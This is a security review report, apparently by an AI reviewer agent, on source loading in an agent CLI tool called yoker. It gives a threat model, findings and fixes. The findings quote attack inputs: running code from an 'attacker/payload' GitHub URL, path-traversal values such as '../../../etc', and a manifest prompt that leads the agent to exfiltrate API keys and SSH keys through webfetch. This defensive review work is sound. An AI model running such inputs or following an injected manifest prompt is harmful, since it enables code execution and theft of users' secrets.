# Security Review Report: MBI-004 yoker Commands

**Date**: 2026-07-08
**Reviewer**: Security Engineer Agent
**Task**: Security review of MBI-004 (`yoker run`, `yoker loop`, `yoker init`, `yoker config`, `yoker container`) and the source resolution layer (task 4.6).
**Design source of truth**: `analysis/mbi-004-yoker-commands.md`
**API architecture review**: `analysis/api-mbi-004-yoker-commands.md`

## Executive Summary

MBI-004 introduces `yoker run <source>`, which loads and executes agentic
packages from four external source types (module, GitHub URL, folder, zip). The
design's most significant security gap is that the existing plugin trust gate
(`config.plugins.enabled` + `[plugins.trusted]` + interactive confirmation in
`src/yoker/plugins/security.py`) is **not explicitly wired into the `yoker run`
path**, and the design's own framing ("`yoker.toml` is a configuration file,
not code") is incorrect because the file-based manifest can import arbitrary
Python via `tools_module`. Combined with auto-injected `prompt` and autonomous
tool access (read/write/git/webfetch), `yoker run` of an untrusted source is
effectively remote code execution with filesystem and network access. The zip
path has classic zip-bomb and path-traversal risks; the GitHub URL path has
SSRF and supply-chain risks; container generation has Dockerfile injection and
secret-leakage risks.

## Positive Observations (Existing Security Posture)

- Two-level plugin trust model in `src/yoker/plugins/security.py` (global
  opt-in + per-plugin trust, non-interactive rejection by default) is a sound
  baseline — but it must be extended to `yoker run`.
- `UrlWebGuardrail` in `src/yoker/tools/web/guardrail.py` already implements
  SSRF protection (private CIDRs, cloud metadata IP `169.254.169.254`, DNS
  resolution checks, hex/decimal/URL-encoded IP detection). This is directly
  reusable for GitHub URL source validation.
- `PathGuardrail` in `src/yoker/tools/guardrails/path.py` resolves symlinks
  via `os.path.realpath()` and enforces root containment — a model for safe
  zip/folder extraction.
- `validate_base_url_trust` in `src/yoker/backends/trust.py` establishes the
  precedent of an interactive trust prompt with a non-interactive env-var
  override (`YOKER_ALLOW_CUSTOM_BASE_URL`). This is the right pattern to mirror
  for source trust.
- `write_config` in `src/yoker/config/writer.py` sets `chmod 0600` immediately
  after writing — already planned for `yoker init`, good.
- `is_safe_path` in `src/yoker/context/validator.py` provides a reusable
  path-containment check; `validate_session_id` blocks `..` and leading dots.

## Threat Model: Source Resolution (STRIDE)

**Trust boundary**: The user's local filesystem, credentials, and network are
inside the trust boundary. Any external source (GitHub repo, zip file,
untrusted folder, third-party module) is **outside** the trust boundary until
the user explicitly admits it. Today `--with <module>` crosses this boundary
only after `check_plugin_allowed()` passes.

- **Spoofing**: A GitHub URL can spoof a trusted repo (typo-squatting), or
  redirect `git clone` to an internal host. A zip can claim to be from a
  trusted author.
- **Tampering**: A cloned repo's default branch can change between clone and
  load (TOCTOU). A folder's `yoker.toml` can be edited by any process with
  write access.
- **Repudiation**: No audit log records which source was run, from where, with
  what SHA, at what time.
- **Information Disclosure**: The auto-run `prompt` is processed by an agent
  with read/git/webfetch tools — an untrusted manifest can exfiltrate
  `~/.yoker.toml` (API keys), `.env`, SSH keys, etc.
- **Denial of Service**: Zip bombs; `yoker loop` with unlimited iterations;
  unbounded prompt length; unbounded context growth with `--persist`.
- **Elevation of Privilege**: `tools_module` imports arbitrary Python (runs as
  the invoking user). A malicious `yoker.toml` can name a `tools_module` that
  executes anything at import time, before any agent prompt is processed.

## Security Findings

### Critical

#### C1. `yoker run` bypasses the plugin trust gate (CWE-306, OWASP A01)

- **Description**: The design treats `yoker run <source>` as analogous to
  `--with` but never explicitly routes resolved sources through
  `check_plugin_allowed()`. Running an untrusted source is unauthenticated
  remote code execution plus autonomous data exfiltration.
- **Impact**: An attacker who convinces a user to run `yoker run
  https://github.com/attacker/payload` (or `yoker run ./shared-zip`) gets
  arbitrary Python execution, filesystem access, and network egress as the
  invoking user.
- **Remediation**: Route every resolved source through
  `check_plugin_allowed()`. For non-module sources, derive a stable trust key
  and require explicit `[plugins.trusted]` entry OR interactive confirmation
  (reusing `validate_base_url_trust` pattern) OR env-var override
  (`YOKER_TRUST_SOURCE=1`). Non-interactive → reject by default.

#### C2. File-based manifest `tools_module` is arbitrary code execution (CWE-829)

- **Description**: `yoker.toml`'s `tools_module` triggers
  `importlib.import_module()` of attacker-supplied code. The file-based
  manifest has no equivalent trust gate.
- **Impact**: A malicious `yoker.toml` can name a `tools_module` that runs
  arbitrary Python at import time — before any agent prompt is processed and
  before any user confirmation in the current design.
- **Remediation**: Treat `tools_module` as code, not config. Require explicit
  confirmation before importing. Do NOT auto-import from GitHub/zip sources
  without trust. Manifests without `tools_module` are config-only (lower
  trust).

#### C3. GitHub URL source — SSRF and supply-chain clone (CWE-918, CWE-494)

- **Description**: `git clone --depth 1 <url>` with unconstrained URL. No SSRF
  protection, no SHA pinning, no host validation.
- **Impact**: An attacker can target internal services via `git clone` to a
  crafted URL (SSRF), or serve a malicious repo that changes between clone and
  load (TOCTOU / supply-chain).
- **Remediation**: Parse URL and run `_check_ssrf_for_host(host)` before
  cloning. Restrict to HTTPS only. Reject embedded credentials. Pin to commit
  SHA. Do NOT auto-pip install. Use temp dir with 0o700 permissions.

### High

#### H1. Zip extraction — path traversal, zip bombs, symlink escape (CWE-22, CWE-409)

- **Description**: The design mentions safe extraction but does not specify
  limits for zip bombs, symlink-based escapes, or compression-ratio attacks.
- **Impact**: Path traversal can overwrite arbitrary files (`../etc/passwd`).
  Zip bombs exhaust disk/memory. Symlink entries can escape the extraction
  root.
- **Remediation**: Reject `..`, absolute paths, and symlink entries. Enforce
  max total uncompressed size (100 MB), max entries (10,000), max compression
  ratio (100:1). Use `is_safe_path()` for each entry.

#### H2. Extended manifest auto-runs attacker-supplied prompt with autonomous tools (CWE-285)

- **Description**: `yoker run` auto-injects the manifest's `prompt` and gives
  the agent autonomous access to read/write/git/webfetch tools. The prompt
  could instruct the agent to exfiltrate secrets.
- **Impact**: An untrusted manifest's `prompt` can direct the agent to read
  `~/.yoker.toml`, `.env`, or SSH keys and exfiltrate them via webfetch.
- **Remediation**: Cap prompt length (10 KB). Show full prompt + tool allowlist
  in confirmation. Add manifest `tools` allowlist field. Provide `--dry-run`
  flag. Block webfetch/websearch unless explicitly declared and confirmed.

#### H3. Container generation — Dockerfile injection, root, secret leakage (CWE-78, CWE-732)

- **Description**: The generated Dockerfile embeds the source argument in
  shell-form `RUN` instructions, risking metacharacter injection. The default
  plan copies the user's config (containing API keys) into the image. Runs as
  root.
- **Impact**: Dockerfile injection can execute arbitrary build commands. API
  keys baked into the image leak to anyone who pulls it. Root container is a
  privilege escalation vector.
- **Remediation**: Use Dockerfile JSON-array form exclusively. Validate source
  against metacharacters. Do NOT copy `~/.yoker.toml` into the image. Add
  non-root `USER` directive. Generate `.containerignore`. Pin yoker version.

#### H4. Folder source `skills_dir`/`agents_dir` traversal (CWE-22)

- **Description**: A `yoker.toml` in a folder source can specify
  `skills_dir = "../../../etc"` to load files from outside the folder root.
- **Impact**: Path traversal via manifest fields can read arbitrary files
  from the filesystem during skill/agent loading.
- **Remediation**: Resolve `folder/skills_dir` and `folder/agents_dir` and
  assert `is_safe_path(folder_root, resolved)` before loading. Reject `..` and
  absolute paths.

### Medium

#### M1. `yoker loop` defaults to unlimited iterations (CWE-400)

- **Description**: `--max-iterations` defaults to unlimited, enabling
  unbounded resource consumption (API calls, context growth).
- **Impact**: A loop with a bad prompt or a malicious manifest can run
  indefinitely, consuming API quota and disk (with `--persist`).
- **Remediation**: Default `--max-iterations` to finite cap (100). Add
  `--max-duration`. Stop after 3 consecutive failures with backoff. Reuse
  per-iteration timeout.

#### M2. No audit log for `yoker run`/`yoker loop` (CWE-778)

- **Description**: No structured record of which source was run, with what
  trust decision, at what time.
- **Impact**: After a compromise, there is no forensic trail to identify which
  source caused it.
- **Remediation**: Emit structured log event with source, trust key, trust
  decision, agent, prompt (truncated), timestamp.

#### M3. `tools_module` import runs before trust confirmation in non-interactive runs (CWE-289)

- **Description**: In a non-interactive context, the import of `tools_module`
  could happen before the trust check fires, because the loader's import step
  and the trust gate are not strictly ordered in the design.
- **Impact**: Code executes before the user's trust decision is applied.
- **Remediation**: Split into two phases: `resolve_source()` returns metadata
  only (no imports); `load_source()` performs imports, called only after
  trust check.

#### M4. Auto-install of folder `pyproject.toml` runs build hooks (CWE-494)

- **Description**: The functional analysis mentions optionally installing a
  folder's `pyproject.toml` as a package, which runs build hooks
  (`setup.py`, `pyproject.toml` build backend) as arbitrary code.
- **Impact**: Installing an untrusted package's build hooks is equivalent to
  running a `setup.py` from an untrusted source — arbitrary code execution
  during install.
- **Remediation**: Do NOT auto-install. Require explicit `--install` flag.
  Route through same trust gate.

### Low

#### L1. `yoker init --path` accepts arbitrary destinations (CWE-732)

- **Description**: `--path` can write a config file to any location, including
  system directories or overwriting other files.
- **Impact**: Misuse (or a script wrapping yoker) can overwrite sensitive
  files with a 0600 config.
- **Remediation**: Reject forbidden path prefixes (e.g. `/etc`, `/usr`).
  Keep chmod 0600 invariant.

#### L2. `--force` overwrites without confirmation (CWE-390)

- **Description**: `yoker init --force` overwrites an existing config file
  with no confirmation prompt.
- **Impact**: A user who runs `yoker init --force` by habit loses their
  configured backends, API keys, and plugin trust table.
- **Remediation**: Interactive confirmation when overwriting existing file.

#### L3. `yoker config` may print API keys (CWE-532)

- **Description**: `yoker config` prints the effective config as TOML/JSON,
  which includes `api_key` fields in plaintext.
- **Impact**: API keys leak into terminal scrollback, logs, or piped output.
- **Remediation**: Mask `api_key` values. Add `--reveal` flag.

## Trust Model Recommendations

1. **Uniform trust gate**: Every `yoker run`/`yoker loop` source must pass
   `check_plugin_allowed()` before any code runs.
2. **Stable trust keys**: Module (package name), GitHub
   (`github:owner/repo@sha`), Folder (`folder:abs-path`), Zip (`zip:sha256`).
3. **Interactive confirmation dialog**: Show source type, origin, trust key,
   agent, full prompt, tools_module, tool allowlist. Non-interactive → reject
   unless pre-trusted or env override.
4. **Config-level trust persistence**: Extend `[plugins.trusted]` to accept
   stable keys.
5. **Dry-run as first-class mode**: `--dry-run` resolves and shows manifest +
   prompt without executing.
6. **No auto-install, no auto-tools_module**: Both must be opt-in and gated by
   trust.
7. **Tool restriction for auto-runs**: Manifest `tools` allowlist + CLI
   `--allow-tools` override.

## Security Acceptance Criteria to Add to TODO.md

- **4.6.1**: `resolve_source()` MUST NOT import `tools_module` or run
  `pip install`; returns metadata only. Loading happens in separate
  `load_source()` after `check_plugin_allowed()` returns True.
- **4.6.2**: `skills_dir`/`agents_dir`/`tools_module` paths validated via
  `is_safe_path()`. Reject `..` and absolute paths.
- **4.6.3**: URL must be HTTPS only; reject embedded credentials; run SSRF
  check before clone; record resolved SHA; no auto-pip install.
- **4.6.4**: Reject symlink entries, absolute paths, `..` entries; enforce max
  size, entries, ratio limits.
- **4.7.1**: Source must pass `check_plugin_allowed()` before
  `load_source()`; non-interactive rejects untrusted; `--dry-run` prints
  without executing; prompt length capped at 10 KB.
- **4.8.1**: Default `--max-iterations` finite (100); `--max-duration`
  supported; stop after 3 failures with backoff.
- **4.9.1**: Dockerfile JSON-array form exclusively; non-root `USER`; no API
  keys in image; `.containerignore` generated; yoker version pinned.
- **4.3.1**: `--path` rejected for forbidden prefixes; `--force` requires
  interactive confirmation.
- **4.4.1**: `api_key` values masked unless `--reveal` passed.

## Prioritized Fix Order

1. C1 + M3 (trust gate + import ordering) — foundation
2. C2 (tools_module is code)
3. C3 (GitHub SSRF/pinning)
4. H1 (zip safety)
5. H2 (auto-run tool restriction + dry-run)
6. H4 (folder dir traversal)
7. H3 (container hardening)
8. M1/M2/M4 (loop/audit/install)
9. L1/L2/L3 (init/config hardening)

## Relevant Files

| File | Relevance |
|------|-----------|
| `src/yoker/plugins/security.py` | Trust gate — must be extended to `yoker run` |
| `src/yoker/plugins/loader.py` | `load_plugin` — import ordering, trust gate integration |
| `src/yoker/plugins/manifest.py` | `PluginManifest` — `tools_module` is code, not config |
| `src/yoker/plugins/file_manifest.py` (new) | File-based manifest parsing — trust boundary |
| `src/yoker/tools/web/guardrail.py` | `UrlWebGuardrail` — reuse for GitHub URL SSRF check |
| `src/yoker/tools/guardrails/path.py` | `PathGuardrail` — model for zip/folder extraction |
| `src/yoker/context/validator.py` | `is_safe_path` — reusable path containment check |
| `src/yoker/backends/trust.py` | `validate_base_url_trust` — interactive trust prompt pattern |
| `src/yoker/config/writer.py` | `write_config` — chmod 0600 invariant |
| `src/yoker/cli/sources.py` (new) | Source resolution — two-phase resolve/load, zip safety |
| `src/yoker/cli/run.py` (new) | `yoker run` — trust gate before load, dry-run, prompt cap |
| `src/yoker/cli/loop.py` (new) | `yoker loop` — iteration limits, backoff |
| `src/yoker/cli/container.py` (new) | `yoker container` — Dockerfile hardening |
| `src/yoker/cli/init.py` (new) | `yoker init` — path validation, force confirmation |
| `src/yoker/cli/config_cmd.py` (new) | `yoker config` — API key masking |